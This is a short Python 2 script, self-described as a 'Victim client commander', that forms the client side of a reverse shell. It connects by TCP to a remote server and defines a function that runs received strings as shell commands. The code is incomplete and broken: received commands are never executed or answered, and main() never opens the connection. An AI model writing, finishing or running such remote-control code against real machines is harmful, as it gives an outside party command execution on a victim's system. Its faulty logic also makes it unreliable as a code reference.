import subprocess
import socket
import argparse

#-------- Isage Function-------------------
def usage():
	print 
	print
	print "Examples: "
	print "Client.py -a 192.168.0.33 -p 9999"
	exit(0)
#--------End Usage Function----------------

#--------Execute Command Function----------
def execute_command(cmd):
	cmd = cmd.rstrip()

	try:
		results = subprocess.check_output(cmd, stderr= subprocess.STDOUT, shell = True)
	except Exception as e:
		results = "Could not execute the command"+cmd

	return results

#---------End Execute Command Function------------

#---------Receive Function-------------------------
def receive_data(client):
	try:
		while  True:
			received_cmd = ""
			received_cmd += client.recv(4096)
	except Exception, e:
		print str(e)
		pass

#----------End Receive Function--------------------

#----------Client Connect Function----------------
def client_connect(host, port):
	client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		client.connect((host, port))
		print "Connected with the server" + host + "at port number" + str(port)
		receive_data(client)
	except Exception as e:
		print str(e)
		client.close()
#----------End Client Connect Function-----------

#-----------Main Function-----------------------
def  main():
	parse = argparse.ArgumentParser('Victim client commander')
	parse.add_argument("-a","--address", type=str, help="The server IP address", default = "192.168.1.105")
	parse.add_argument("-p","--port", type=int, help="The port number to connect with", default = 9999)

	args= parse.parse_args()

	if args.address == None:
		usage()

	target_host = args.address
	port_number = args.port

#-----------End Main Function-----------------------

#-----------Application Entry Point-----------------------
if __name__ == '__main__':
	main()



